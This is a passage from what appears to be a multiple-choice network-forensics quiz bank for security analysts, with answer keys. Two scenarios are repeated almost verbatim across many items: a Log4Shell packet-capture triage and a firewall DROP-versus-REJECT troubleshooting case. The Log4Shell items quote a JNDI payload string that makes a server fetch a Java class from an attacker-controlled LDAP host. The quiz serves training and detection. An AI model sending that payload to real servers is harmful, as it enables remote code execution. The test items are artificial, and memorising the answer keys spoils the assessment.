    "explanation": "The packet telemetry proves the full exploitation chain succeeded: the server parsed the JNDI lookup, initiated an outbound connection on port 1389, completed the 3-way handshake, and downloaded 4,200 bytes of data (the malicious Java class). Strict egress filtering blocking outbound LDAP/RMI would have prevented the payload download."
  },
  {
    "id": "q_c2_m8_120",
    "topic": "Log4Shell Exploit Analysis & Outbound Traffic Triage",
    "difficulty": "difficult",
    "q": "[CISA Emergency Directive AA21-356A Scenario 20] In December 2021, an enterprise SOC detects an external attacker submitting HTTP GET requests containing the payload \"${jndi:ldap://203.0.113.55:1389/Exploit}\" against internal web server 172.30.5.10. An analyst captures traffic on the perimeter firewall. Applying the filter \"tcp.flags.syn == 1 && tcp.flags.ack == 0 && tcp.dstport == 1389\" reveals that the internal web server immediately transmitted a TCP SYN to 203.0.113.55 on port 1389, followed by an immediate SYN-ACK from the attacker, a completed 3-way handshake, and 4,200 bytes of outbound TCP data before terminating. What does this packet evidence conclusively prove regarding the incident?",
    "options": [
      "The server was vulnerable to Log4Shell (CVE-2021-44228), successfully executed the malicious JNDI string, connected out to the attacker's LDAP server, and downloaded/executed the secondary Java payload; the host is fully compromised.",
      "The firewall successfully blocked the attack because LDAP is an unroutable protocol.",
      "The attack was a false positive because Log4j only operates over UDP port 53.",
      "The attacker's server crashed because 1389 is an invalid TCP port number."
    ],
    "correct": 0,
    "explanation": "The packet telemetry proves the full exploitation chain succeeded: the server parsed the JNDI lookup, initiated an outbound connection on port 1389, completed the 3-way handshake, and downloaded 4,200 bytes of data (the malicious Java class). Strict egress filtering blocking outbound LDAP/RMI would have prevented the payload download."
  },
  {
    "id": "q_c2_m8_121",
    "topic": "Log4Shell Exploit Analysis & Outbound Traffic Triage",
    "difficulty": "difficult",
    "q": "[CISA Emergency Directive AA21-356A Scenario 21] In December 2021, an enterprise SOC detects an external attacker submitting HTTP GET requests containing the payload \"${jndi:ldap://203.0.113.55:1389/Exploit}\" against internal web server 172.30.5.10. An analyst captures traffic on the perimeter firewall. Applying the filter \"tcp.flags.syn == 1 && tcp.flags.ack == 0 && tcp.dstport == 1389\" reveals that the internal web server immediately transmitted a TCP SYN to 203.0.113.55 on port 1389, followed by an immediate SYN-ACK from the attacker, a completed 3-way handshake, and 4,200 bytes of outbound TCP data before terminating. What does this packet evidence conclusively prove regarding the incident?",
    "options": [
      "The server was vulnerable to Log4Shell (CVE-2021-44228), successfully executed the malicious JNDI string, connected out to the attacker's LDAP server, and downloaded/executed the secondary Java payload; the host is fully compromised.",
      "The firewall successfully blocked the attack because LDAP is an unroutable protocol.",
      "The attack was a false positive because Log4j only operates over UDP port 53.",
      "The attacker's server crashed because 1389 is an invalid TCP port number."
    ],
    "correct": 0,
    "explanation": "The packet telemetry proves the full exploitation chain succeeded: the server parsed the JNDI lookup, initiated an outbound connection on port 1389, completed the 3-way handshake, and downloaded 4,200 bytes of data (the malicious Java class). Strict egress filtering blocking outbound LDAP/RMI would have prevented the payload download."
  },
  {
    "id": "q_c2_m8_122",
    "topic": "Log4Shell Exploit Analysis & Outbound Traffic Triage",
    "difficulty": "difficult",
    "q": "[CISA Emergency Directive AA21-356A Scenario 22] In December 2021, an enterprise SOC detects an external attacker submitting HTTP GET requests containing the payload \"${jndi:ldap://203.0.113.55:1389/Exploit}\" against internal web server 172.30.5.10. An analyst captures traffic on the perimeter firewall. Applying the filter \"tcp.flags.syn == 1 && tcp.flags.ack == 0 && tcp.dstport == 1389\" reveals that the internal web server immediately transmitted a TCP SYN to 203.0.113.55 on port 1389, followed by an immediate SYN-ACK from the attacker, a completed 3-way handshake, and 4,200 bytes of outbound TCP data before terminating. What does this packet evidence conclusively prove regarding the incident?",
    "options": [
      "The server was vulnerable to Log4Shell (CVE-2021-44228), successfully executed the malicious JNDI string, connected out to the attacker's LDAP server, and downloaded/executed the secondary Java payload; the host is fully compromised.",
      "The firewall successfully blocked the attack because LDAP is an unroutable protocol.",
      "The attack was a false positive because Log4j only operates over UDP port 53.",
      "The attacker's server crashed because 1389 is an invalid TCP port number."
    ],
    "correct": 0,
    "explanation": "The packet telemetry proves the full exploitation chain succeeded: the server parsed the JNDI lookup, initiated an outbound connection on port 1389, completed the 3-way handshake, and downloaded 4,200 bytes of data (the malicious Java class). Strict egress filtering blocking outbound LDAP/RMI would have prevented the payload download."
  },
  {
    "id": "q_c2_m8_123",
    "topic": "Log4Shell Exploit Analysis & Outbound Traffic Triage",
    "difficulty": "difficult",
    "q": "[CISA Emergency Directive AA21-356A Scenario 23] In December 2021, an enterprise SOC detects an external attacker submitting HTTP GET requests containing the payload \"${jndi:ldap://203.0.113.55:1389/Exploit}\" against internal web server 172.30.5.10. An analyst captures traffic on the perimeter firewall. Applying the filter \"tcp.flags.syn == 1 && tcp.flags.ack == 0 && tcp.dstport == 1389\" reveals that the internal web server immediately transmitted a TCP SYN to 203.0.113.55 on port 1389, followed by an immediate SYN-ACK from the attacker, a completed 3-way handshake, and 4,200 bytes of outbound TCP data before terminating. What does this packet evidence conclusively prove regarding the incident?",
    "options": [
      "The server was vulnerable to Log4Shell (CVE-2021-44228), successfully executed the malicious JNDI string, connected out to the attacker's LDAP server, and downloaded/executed the secondary Java payload; the host is fully compromised.",
      "The firewall successfully blocked the attack because LDAP is an unroutable protocol.",
      "The attack was a false positive because Log4j only operates over UDP port 53.",
      "The attacker's server crashed because 1389 is an invalid TCP port number."
    ],
    "correct": 0,
    "explanation": "The packet telemetry proves the full exploitation chain succeeded: the server parsed the JNDI lookup, initiated an outbound connection on port 1389, completed the 3-way handshake, and downloaded 4,200 bytes of data (the malicious Java class). Strict egress filtering blocking outbound LDAP/RMI would have prevented the payload download."
  },
  {
    "id": "q_c2_m8_124",
    "topic": "Log4Shell Exploit Analysis & Outbound Traffic Triage",
    "difficulty": "difficult",
    "q": "[CISA Emergency Directive AA21-356A Scenario 24] In December 2021, an enterprise SOC detects an external attacker submitting HTTP GET requests containing the payload \"${jndi:ldap://203.0.113.55:1389/Exploit}\" against internal web server 172.30.5.10. An analyst captures traffic on the perimeter firewall. Applying the filter \"tcp.flags.syn == 1 && tcp.flags.ack == 0 && tcp.dstport == 1389\" reveals that the internal web server immediately transmitted a TCP SYN to 203.0.113.55 on port 1389, followed by an immediate SYN-ACK from the attacker, a completed 3-way handshake, and 4,200 bytes of outbound TCP data before terminating. What does this packet evidence conclusively prove regarding the incident?",
    "options": [
      "The server was vulnerable to Log4Shell (CVE-2021-44228), successfully executed the malicious JNDI string, connected out to the attacker's LDAP server, and downloaded/executed the secondary Java payload; the host is fully compromised.",
      "The firewall successfully blocked the attack because LDAP is an unroutable protocol.",
      "The attack was a false positive because Log4j only operates over UDP port 53.",
      "The attacker's server crashed because 1389 is an invalid TCP port number."
    ],
    "correct": 0,
    "explanation": "The packet telemetry proves the full exploitation chain succeeded: the server parsed the JNDI lookup, initiated an outbound connection on port 1389, completed the 3-way handshake, and downloaded 4,200 bytes of data (the malicious Java class). Strict egress filtering blocking outbound LDAP/RMI would have prevented the payload download."
  },
  {
    "id": "q_c2_m8_125",
    "topic": "Log4Shell Exploit Analysis & Outbound Traffic Triage",
    "difficulty": "difficult",
    "q": "[CISA Emergency Directive AA21-356A Scenario 25] In December 2021, an enterprise SOC detects an external attacker submitting HTTP GET requests containing the payload \"${jndi:ldap://203.0.113.55:1389/Exploit}\" against internal web server 172.30.5.10. An analyst captures traffic on the perimeter firewall. Applying the filter \"tcp.flags.syn == 1 && tcp.flags.ack == 0 && tcp.dstport == 1389\" reveals that the internal web server immediately transmitted a TCP SYN to 203.0.113.55 on port 1389, followed by an immediate SYN-ACK from the attacker, a completed 3-way handshake, and 4,200 bytes of outbound TCP data before terminating. What does this packet evidence conclusively prove regarding the incident?",
    "options": [
      "The server was vulnerable to Log4Shell (CVE-2021-44228), successfully executed the malicious JNDI string, connected out to the attacker's LDAP server, and downloaded/executed the secondary Java payload; the host is fully compromised.",
      "The firewall successfully blocked the attack because LDAP is an unroutable protocol.",
      "The attack was a false positive because Log4j only operates over UDP port 53.",
      "The attacker's server crashed because 1389 is an invalid TCP port number."
    ],
    "correct": 0,
    "explanation": "The packet telemetry proves the full exploitation chain succeeded: the server parsed the JNDI lookup, initiated an outbound connection on port 1389, completed the 3-way handshake, and downloaded 4,200 bytes of data (the malicious Java class). Strict egress filtering blocking outbound LDAP/RMI would have prevented the payload download."
  },
  {
    "id": "q_c2_m8_126",
    "topic": "Connection Triage: DROP vs REJECT vs Downed Daemon",
    "difficulty": "difficult",
    "q": "[Troubleshooting Lab Scenario 1] An analyst investigates a connection failure between client 172.30.8.20 and server 172.30.8.10. In Capture A (port 8081), the client sends a SYN and then three retransmissions over 4 seconds with zero response, resulting in a curl timeout (exit code 28). In Capture B (port 8082), the client sends a SYN and receives a TCP RST/ACK within 0.3 milliseconds, resulting in a connection refused error (curl exit code 7). The server administrator claims: \"Both ports are failing, so the network firewall must be blocking both.\" How does the analyst refute the administrator using packet evidence?",
    "options": [
      "Port 8081 is indeed being blocked by a firewall DROP rule (or path severance), as proven by the total silence and SYN retransmissions; however, Port 8082 reached the server operating system, which actively returned a RST/ACK because the server itself has no daemon listening on port 8082.",
      "Both ports are functioning perfectly and the curl client software is defective.",
      "Port 8082 is blocked by an upstream BGP routing loop.",
      "The server's physical network interface card is operating in half-duplex mode."
    ],
    "correct": 0,
    "explanation": "A RST/ACK cannot generate itself out of thin air; it proves that the network path and firewalls forwarded the packet to the server, and the server's OS actively rejected it because no process was listening on 8082. Conversely, the complete silence on 8081 proves a firewall DROP rule. The fix for 8081 is network policy; the fix for 8082 is starting the server service."
  },
  {
    "id": "q_c2_m8_127",
    "topic": "Connection Triage: DROP vs REJECT vs Downed Daemon",
    "difficulty": "difficult",
    "q": "[Troubleshooting Lab Scenario 2] An analyst investigates a connection failure between client 172.30.8.20 and server 172.30.8.10. In Capture A (port 8081), the client sends a SYN and then three retransmissions over 4 seconds with zero response, resulting in a curl timeout (exit code 28). In Capture B (port 8082), the client sends a SYN and receives a TCP RST/ACK within 0.3 milliseconds, resulting in a connection refused error (curl exit code 7). The server administrator claims: \"Both ports are failing, so the network firewall must be blocking both.\" How does the analyst refute the administrator using packet evidence?",
    "options": [
      "Port 8081 is indeed being blocked by a firewall DROP rule (or path severance), as proven by the total silence and SYN retransmissions; however, Port 8082 reached the server operating system, which actively returned a RST/ACK because the server itself has no daemon listening on port 8082.",
      "Both ports are functioning perfectly and the curl client software is defective.",
      "Port 8082 is blocked by an upstream BGP routing loop.",
      "The server's physical network interface card is operating in half-duplex mode."
    ],
    "correct": 0,
    "explanation": "A RST/ACK cannot generate itself out of thin air; it proves that the network path and firewalls forwarded the packet to the server, and the server's OS actively rejected it because no process was listening on 8082. Conversely, the complete silence on 8081 proves a firewall DROP rule. The fix for 8081 is network policy; the fix for 8082 is starting the server service."
  },
  {
    "id": "q_c2_m8_128",
    "topic": "Connection Triage: DROP vs REJECT vs Downed Daemon",
    "difficulty": "difficult",
    "q": "[Troubleshooting Lab Scenario 3] An analyst investigates a connection failure between client 172.30.8.20 and server 172.30.8.10. In Capture A (port 8081), the client sends a SYN and then three retransmissions over 4 seconds with zero response, resulting in a curl timeout (exit code 28). In Capture B (port 8082), the client sends a SYN and receives a TCP RST/ACK within 0.3 milliseconds, resulting in a connection refused error (curl exit code 7). The server administrator claims: \"Both ports are failing, so the network firewall must be blocking both.\" How does the analyst refute the administrator using packet evidence?",
    "options": [
      "Port 8081 is indeed being blocked by a firewall DROP rule (or path severance), as proven by the total silence and SYN retransmissions; however, Port 8082 reached the server operating system, which actively returned a RST/ACK because the server itself has no daemon listening on port 8082.",
      "Both ports are functioning perfectly and the curl client software is defective.",
      "Port 8082 is blocked by an upstream BGP routing loop.",
      "The server's physical network interface card is operating in half-duplex mode."
    ],
    "correct": 0,
    "explanation": "A RST/ACK cannot generate itself out of thin air; it proves that the network path and firewalls forwarded the packet to the server, and the server's OS actively rejected it because no process was listening on 8082. Conversely, the complete silence on 8081 proves a firewall DROP rule. The fix for 8081 is network policy; the fix for 8082 is starting the server service."
  },
  {
    "id": "q_c2_m8_129",
    "topic": "Connection Triage: DROP vs REJECT vs Downed Daemon",
    "difficulty": "difficult",
    "q": "[Troubleshooting Lab Scenario 4] An analyst investigates a connection failure between client 172.30.8.20 and server 172.30.8.10. In Capture A (port 8081), the client sends a SYN and then three retransmissions over 4 seconds with zero response, resulting in a curl timeout (exit code 28). In Capture B (port 8082), the client sends a SYN and receives a TCP RST/ACK within 0.3 milliseconds, resulting in a connection refused error (curl exit code 7). The server administrator claims: \"Both ports are failing, so the network firewall must be blocking both.\" How does the analyst refute the administrator using packet evidence?",
    "options": [
      "Port 8081 is indeed being blocked by a firewall DROP rule (or path severance), as proven by the total silence and SYN retransmissions; however, Port 8082 reached the server operating system, which actively returned a RST/ACK because the server itself has no daemon listening on port 8082.",
      "Both ports are functioning perfectly and the curl client software is defective.",
      "Port 8082 is blocked by an upstream BGP routing loop.",
      "The server's physical network interface card is operating in half-duplex mode."
    ],
    "correct": 0,
    "explanation": "A RST/ACK cannot generate itself out of thin air; it proves that the network path and firewalls forwarded the packet to the server, and the server's OS actively rejected it because no process was listening on 8082. Conversely, the complete silence on 8081 proves a firewall DROP rule. The fix for 8081 is network policy; the fix for 8082 is starting the server service."
  },
  {
    "id": "q_c2_m8_130",
    "topic": "Connection Triage: DROP vs REJECT vs Downed Daemon",
    "difficulty": "difficult",
    "q": "[Troubleshooting Lab Scenario 5] An analyst investigates a connection failure between client 172.30.8.20 and server 172.30.8.10. In Capture A (port 8081), the client sends a SYN and then three retransmissions over 4 seconds with zero response, resulting in a curl timeout (exit code 28). In Capture B (port 8082), the client sends a SYN and receives a TCP RST/ACK within 0.3 milliseconds, resulting in a connection refused error (curl exit code 7). The server administrator claims: \"Both ports are failing, so the network firewall must be blocking both.\" How does the analyst refute the administrator using packet evidence?",
    "options": [
      "Port 8081 is indeed being blocked by a firewall DROP rule (or path severance), as proven by the total silence and SYN retransmissions; however, Port 8082 reached the server operating system, which actively returned a RST/ACK because the server itself has no daemon listening on port 8082.",
      "Both ports are functioning perfectly and the curl client software is defective.",
      "Port 8082 is blocked by an upstream BGP routing loop.",
      "The server's physical network interface card is operating in half-duplex mode."
    ],
    "correct": 0,
    "explanation": "A RST/ACK cannot generate itself out of thin air; it proves that the network path and firewalls forwarded the packet to the server, and the server's OS actively rejected it because no process was listening on 8082. Conversely, the complete silence on 8081 proves a firewall DROP rule. The fix for 8081 is network policy; the fix for 8082 is starting the server service."
  },
  {
    "id": "q_c2_m8_131",
    "topic": "Connection Triage: DROP vs REJECT vs Downed Daemon",
    "difficulty": "difficult",
    "q": "[Troubleshooting Lab Scenario 6] An analyst investigates a connection failure between client 172.30.8.20 and server 172.30.8.10. In Capture A (port 8081), the client sends a SYN and then three retransmissions over 4 seconds with zero response, resulting in a curl timeout (exit code 28). In Capture B (port 8082), the client sends a SYN and receives a TCP RST/ACK within 0.3 milliseconds, resulting in a connection refused error (curl exit code 7). The server administrator claims: \"Both ports are failing, so the network firewall must be blocking both.\" How does the analyst refute the administrator using packet evidence?",
    "options": [
      "Port 8081 is indeed being blocked by a firewall DROP rule (or path severance), as proven by the total silence and SYN retransmissions; however, Port 8082 reached the server operating system, which actively returned a RST/ACK because the server itself has no daemon listening on port 8082.",
      "Both ports are functioning perfectly and the curl client software is defective.",
      "Port 8082 is blocked by an upstream BGP routing loop.",
      "The server's physical network interface card is operating in half-duplex mode."
    ],
    "correct": 0,
    "explanation": "A RST/ACK cannot generate itself out of thin air; it proves that the network path and firewalls forwarded the packet to the server, and the server's OS actively rejected it because no process was listening on 8082. Conversely, the complete silence on 8081 proves a firewall DROP rule. The fix for 8081 is network policy; the fix for 8082 is starting the server service."
  },
  {
    "id": "q_c2_m8_132",
    "topic": "Connection Triage: DROP vs REJECT vs Downed Daemon",
    "difficulty": "difficult",
    "q": "[Troubleshooting Lab Scenario 7] An analyst investigates a connection failure between client 172.30.8.20 and server 172.30.8.10. In Capture A (port 8081), the client sends a SYN and then three retransmissions over 4 seconds with zero response, resulting in a curl timeout (exit code 28). In Capture B (port 8082), the client sends a SYN and receives a TCP RST/ACK within 0.3 milliseconds, resulting in a connection refused error (curl exit code 7). The server administrator claims: \"Both ports are failing, so the network firewall must be blocking both.\" How does the analyst refute the administrator using packet evidence?",
    "options": [
      "Port 8081 is indeed being blocked by a firewall DROP rule (or path severance), as proven by the total silence and SYN retransmissions; however, Port 8082 reached the server operating system, which actively returned a RST/ACK because the server itself has no daemon listening on port 8082.",
      "Both ports are functioning perfectly and the curl client software is defective.",
      "Port 8082 is blocked by an upstream BGP routing loop.",
      "The server's physical network interface card is operating in half-duplex mode."
    ],
    "correct": 0,
    "explanation": "A RST/ACK cannot generate itself out of thin air; it proves that the network path and firewalls forwarded the packet to the server, and the server's OS actively rejected it because no process was listening on 8082. Conversely, the complete silence on 8081 proves a firewall DROP rule. The fix for 8081 is network policy; the fix for 8082 is starting the server service."
  },
  {
    "id": "q_c2_m8_133",
    "topic": "Connection Triage: DROP vs REJECT vs Downed Daemon",
    "difficulty": "difficult",
    "q": "[Troubleshooting Lab Scenario 8] An analyst investigates a connection failure between client 172.30.8.20 and server 172.30.8.10. In Capture A (port 8081), the client sends a SYN and then three retransmissions over 4 seconds with zero response, resulting in a curl timeout (exit code 28). In Capture B (port 8082), the client sends a SYN and receives a TCP RST/ACK within 0.3 milliseconds, resulting in a connection refused error (curl exit code 7). The server administrator claims: \"Both ports are failing, so the network firewall must be blocking both.\" How does the analyst refute the administrator using packet evidence?",
    "options": [
      "Port 8081 is indeed being blocked by a firewall DROP rule (or path severance), as proven by the total silence and SYN retransmissions; however, Port 8082 reached the server operating system, which actively returned a RST/ACK because the server itself has no daemon listening on port 8082.",
      "Both ports are functioning perfectly and the curl client software is defective.",
      "Port 8082 is blocked by an upstream BGP routing loop.",
      "The server's physical network interface card is operating in half-duplex mode."
    ],
    "correct": 0,
    "explanation": "A RST/ACK cannot generate itself out of thin air; it proves that the network path and firewalls forwarded the packet to the server, and the server's OS actively rejected it because no process was listening on 8082. Conversely, the complete silence on 8081 proves a firewall DROP rule. The fix for 8081 is network policy; the fix for 8082 is starting the server service."
  },
  {
    "id": "q_c2_m8_134",
    "topic": "Connection Triage: DROP vs REJECT vs Downed Daemon",
    "difficulty": "difficult",
    "q": "[Troubleshooting Lab Scenario 9] An analyst investigates a connection failure between client 172.30.8.20 and server 172.30.8.10. In Capture A (port 8081), the client sends a SYN and then three retransmissions over 4 seconds with zero response, resulting in a curl timeout (exit code 28). In Capture B (port 8082), the client sends a SYN and receives a TCP RST/ACK within 0.3 milliseconds, resulting in a connection refused error (curl exit code 7). The server administrator claims: \"Both ports are failing, so the network firewall must be blocking both.\" How does the analyst refute the administrator using packet evidence?",
    "options": [
      "Port 8081 is indeed being blocked by a firewall DROP rule (or path severance), as proven by the total silence and SYN retransmissions; however, Port 8082 reached the server operating system, which actively returned a RST/ACK because the server itself has no daemon listening on port 8082.",
      "Both ports are functioning perfectly and the curl client software is defective.",
      "Port 8082 is blocked by an upstream BGP routing loop.",
      "The server's physical network interface card is operating in half-duplex mode."
    ],
    "correct": 0,
    "explanation": "A RST/ACK cannot generate itself out of thin air; it proves that the network path and firewalls forwarded the packet to the server, and the server's OS actively rejected it because no process was listening on 8082. Conversely, the complete silence on 8081 proves a firewall DROP rule. The fix for 8081 is network policy; the fix for 8082 is starting the server service."
  },
  {
    "id": "q_c2_m8_135",
    "topic": "Connection Triage: DROP vs REJECT vs Downed Daemon",
    "difficulty": "difficult",
    "q": "[Troubleshooting Lab Scenario 10] An analyst investigates a connection failure between client 172.30.8.20 and server 172.30.8.10. In Capture A (port 8081), the client sends a SYN and then three retransmissions over 4 seconds with zero response, resulting in a curl timeout (exit code 28). In Capture B (port 8082), the client sends a SYN and receives a TCP RST/ACK within 0.3 milliseconds, resulting in a connection refused error (curl exit code 7). The server administrator claims: \"Both ports are failing, so the network firewall must be blocking both.\" How does the analyst refute the administrator using packet evidence?",
    "options": [
      "Port 8081 is indeed being blocked by a firewall DROP rule (or path severance), as proven by the total silence and SYN retransmissions; however, Port 8082 reached the server operating system, which actively returned a RST/ACK because the server itself has no daemon listening on port 8082.",
      "Both ports are functioning perfectly and the curl client software is defective.",
      "Port 8082 is blocked by an upstream BGP routing loop.",
      "The server's physical network interface card is operating in half-duplex mode."
    ],
    "correct": 0,
    "explanation": "A RST/ACK cannot generate itself out of thin air; it proves that the network path and firewalls forwarded the packet to the server, and the server's OS actively rejected it because no process was listening on 8082. Conversely, the complete silence on 8081 proves a firewall DROP rule. The fix for 8081 is network policy; the fix for 8082 is starting the server service."
  },
  {
    "id": "q_c2_m8_136",
    "topic": "Connection Triage: DROP vs REJECT vs Downed Daemon",
    "difficulty": "difficult",
    "q": "[Troubleshooting Lab Scenario 11] An analyst investigates a connection failure between client 172.30.8.20 and server 172.30.8.10. In Capture A (port 8081), the client sends a SYN and then three retransmissions over 4 seconds with zero response, resulting in a curl timeout (exit code 28). In Capture B (port 8082), the client sends a SYN and receives a TCP RST/ACK within 0.3 milliseconds, resulting in a connection refused error (curl exit code 7). The server administrator claims: \"Both ports are failing, so the network firewall must be blocking both.\" How does the analyst refute the administrator using packet evidence?",
    "options": [
      "Port 8081 is indeed being blocked by a firewall DROP rule (or path severance), as proven by the total silence and SYN retransmissions; however, Port 8082 reached the server operating system, which actively returned a RST/ACK because the server itself has no daemon listening on port 8082.",
      "Both ports are functioning perfectly and the curl client software is defective.",
      "Port 8082 is blocked by an upstream BGP routing loop.",
      "The server's physical network interface card is operating in half-duplex mode."
    ],
    "correct": 0,
    "explanation": "A RST/ACK cannot generate itself out of thin air; it proves that the network path and firewalls forwarded the packet to the server, and the server's OS actively rejected it because no process was listening on 8082. Conversely, the complete silence on 8081 proves a firewall DROP rule. The fix for 8081 is network policy; the fix for 8082 is starting the server service."
  },
  {
    "id": "q_c2_m8_137",
    "topic": "Connection Triage: DROP vs REJECT vs Downed Daemon",
    "difficulty": "difficult",
    "q": "[Troubleshooting Lab Scenario 12] An analyst investigates a connection failure between client 172.30.8.20 and server 172.30.8.10. In Capture A (port 8081), the client sends a SYN and then three retransmissions over 4 seconds with zero response, resulting in a curl timeout (exit code 28). In Capture B (port 8082), the client sends a SYN and receives a TCP RST/ACK within 0.3 milliseconds, resulting in a connection refused error (curl exit code 7). The server administrator claims: \"Both ports are failing, so the network firewall must be blocking both.\" How does the analyst refute the administrator using packet evidence?",
    "options": [
      "Port 8081 is indeed being blocked by a firewall DROP rule (or path severance), as proven by the total silence and SYN retransmissions; however, Port 8082 reached the server operating system, which actively returned a RST/ACK because the server itself has no daemon listening on port 8082.",
      "Both ports are functioning perfectly and the curl client software is defective.",
      "Port 8082 is blocked by an upstream BGP routing loop.",
      "The server's physical network interface card is operating in half-duplex mode."
    ],
    "correct": 0,
    "explanation": "A RST/ACK cannot generate itself out of thin air; it proves that the network path and firewalls forwarded the packet to the server, and the server's OS actively rejected it because no process was listening on 8082. Conversely, the complete silence on 8081 proves a firewall DROP rule. The fix for 8081 is network policy; the fix for 8082 is starting the server service."
  },
  {
    "id": "q_c2_m8_138",
    "topic": "Connection Triage: DROP vs REJECT vs Downed Daemon",
    "difficulty": "difficult",
    "q": "[Troubleshooting Lab Scenario 13] An analyst investigates a connection failure between client 172.30.8.20 and server 172.30.8.10. In Capture A (port 8081), the client sends a SYN and then three retransmissions over 4 seconds with zero response, resulting in a curl timeout (exit code 28). In Capture B (port 8082), the client sends a SYN and receives a TCP RST/ACK within 0.3 milliseconds, resulting in a connection refused error (curl exit code 7). The server administrator claims: \"Both ports are failing, so the network firewall must be blocking both.\" How does the analyst refute the administrator using packet evidence?",
    "options": [
      "Port 8081 is indeed being blocked by a firewall DROP rule (or path severance), as proven by the total silence and SYN retransmissions; however, Port 8082 reached the server operating system, which actively returned a RST/ACK because the server itself has no daemon listening on port 8082.",
      "Both ports are functioning perfectly and the curl client software is defective.",
      "Port 8082 is blocked by an upstream BGP routing loop.",
      "The server's physical network interface card is operating in half-duplex mode."
    ],
    "correct": 0,
    "explanation": "A RST/ACK cannot generate itself out of thin air; it proves that the network path and firewalls forwarded the packet to the server, and the server's OS actively rejected it because no process was listening on 8082. Conversely, the complete silence on 8081 proves a firewall DROP rule. The fix for 8081 is network policy; the fix for 8082 is starting the server service."
  },
  {
    "id": "q_c2_m8_139",
    "topic": "Connection Triage: DROP vs REJECT vs Downed Daemon",
    "difficulty": "difficult",
    "q": "[Troubleshooting Lab Scenario 14] An analyst investigates a connection failure between client 172.30.8.20 and server 172.30.8.10. In Capture A (port 8081), the client sends a SYN and then three retransmissions over 4 seconds with zero response, resulting in a curl timeout (exit code 28). In Capture B (port 8082), the client sends a SYN and receives a TCP RST/ACK within 0.3 milliseconds, resulting in a connection refused error (curl exit code 7). The server administrator claims: \"Both ports are failing, so the network firewall must be blocking both.\" How does the analyst refute the administrator using packet evidence?",
    "options": [
      "Port 8081 is indeed being blocked by a firewall DROP rule (or path severance), as proven by the total silence and SYN retransmissions; however, Port 8082 reached the server operating system, which actively returned a RST/ACK because the server itself has no daemon listening on port 8082.",
      "Both ports are functioning perfectly and the curl client software is defective.",
      "Port 8082 is blocked by an upstream BGP routing loop.",
      "The server's physical network interface card is operating in half-duplex mode."
    ],
    "correct": 0,
    "explanation": "A RST/ACK cannot generate itself out of thin air; it proves that the network path and firewalls forwarded the packet to the server, and the server's OS actively rejected it because no process was listening on 8082. Conversely, the complete silence on 8081 proves a firewall DROP rule. The fix for 8081 is network policy; the fix for 8082 is starting the server service."
  },
  {
    "id": "q_c2_m8_140",
    "topic": "Connection Triage: DROP vs REJECT vs Downed Daemon",
    "difficulty": "difficult",
    "q": "[Troubleshooting Lab Scenario 15] An analyst investigates a connection failure between client 172.30.8.20 and server 172.30.8.10. In Capture A (port 8081), the client sends a SYN and then three retransmissions over 4 seconds with zero response, resulting in a curl timeout (exit code 28). In Capture B (port 8082), the client sends a SYN and receives a TCP RST/ACK within 0.3 milliseconds, resulting in a connection refused error (curl exit code 7). The server administrator claims: \"Both ports are failing, so the network firewall must be blocking both.\" How does the analyst refute the administrator using packet evidence?",
    "options": [
      "Port 8081 is indeed being blocked by a firewall DROP rule (or path severance), as proven by the total silence and SYN retransmissions; however, Port 8082 reached the server operating system, which actively returned a RST/ACK because the server itself has no daemon listening on port 8082.",
      "Both ports are functioning perfectly and the curl client software is defective.",
      "Port 8082 is blocked by an upstream BGP routing loop.",
      "The server's physical network interface card is operating in half-duplex mode."
    ],
    "correct": 0,
    "explanation": "A RST/ACK cannot generate itself out of thin air; it proves that the network path and firewalls forwarded the packet to the server, and the server's OS actively rejected it because no process was listening on 8082. Conversely, the complete silence on 8081 proves a firewall DROP rule. The fix for 8081 is network policy; the fix for 8082 is starting the server service."
  },
  {
    "id": "q_c2_m8_141",
    "topic": "Connection Triage: DROP vs REJECT vs Downed Daemon",
    "difficulty": "difficult",
    "q": "[Troubleshooting Lab Scenario 16] An analyst investigates a connection failure between client 172.30.8.20 and server 172.30.8.10. In Capture A (port 8081), the client sends a SYN and then three retransmissions over 4 seconds with zero response, resulting in a curl timeout (exit code 28). In Capture B (port 8082), the client sends a SYN and receives a TCP RST/ACK within 0.3 milliseconds, resulting in a connection refused error (curl exit code 7). The server administrator claims: \"Both ports are failing, so the network firewall must be blocking both.\" How does the analyst refute the administrator using packet evidence?",
    "options": [
      "Port 8081 is indeed being blocked by a firewall DROP rule (or path severance), as proven by the total silence and SYN retransmissions; however, Port 8082 reached the server operating system, which actively returned a RST/ACK because the server itself has no daemon listening on port 8082.",
      "Both ports are functioning perfectly and the curl client software is defective.",
      "Port 8082 is blocked by an upstream BGP routing loop.",
      "The server's physical network interface card is operating in half-duplex mode."
    ],
    "correct": 0,
    "explanation": "A RST/ACK cannot generate itself out of thin air; it proves that the network path and firewalls forwarded the packet to the server, and the server's OS actively rejected it because no process was listening on 8082. Conversely, the complete silence on 8081 proves a firewall DROP rule. The fix for 8081 is network policy; the fix for 8082 is starting the server service."
  },
  {
    "id": "q_c2_m8_142",
    "topic": "Connection Triage: DROP vs REJECT vs Downed Daemon",
    "difficulty": "difficult",
    "q": "[Troubleshooting Lab Scenario 17] An analyst investigates a connection failure between client 172.30.8.20 and server 172.30.8.10. In Capture A (port 8081), the client sends a SYN and then three retransmissions over 4 seconds with zero response, resulting in a curl timeout (exit code 28). In Capture B (port 8082), the client sends a SYN and receives a TCP RST/ACK within 0.3 milliseconds, resulting in a connection refused error (curl exit code 7). The server administrator claims: \"Both ports are failing, so the network firewall must be blocking both.\" How does the analyst refute the administrator using packet evidence?",
    "options": [
      "Port 8081 is indeed being blocked by a firewall DROP rule (or path severance), as proven by the total silence and SYN retransmissions; however, Port 8082 reached the server operating system, which actively returned a RST/ACK because the server itself has no daemon listening on port 8082.",
      "Both ports are functioning perfectly and the curl client software is defective.",
      "Port 8082 is blocked by an upstream BGP routing loop.",
      "The server's physical network interface card is operating in half-duplex mode."
    ],
    "correct": 0,
    "explanation": "A RST/ACK cannot generate itself out of thin air; it proves that the network path and firewalls forwarded the packet to the server, and the server's OS actively rejected it because no process was listening on 8082. Conversely, the complete silence on 8081 proves a firewall DROP rule. The fix for 8081 is network policy; the fix for 8082 is starting the server service."
  },
  {
    "id": "q_c2_m8_143",
    "topic": "Connection Triage: DROP vs REJECT vs Downed Daemon",
    "difficulty": "difficult",
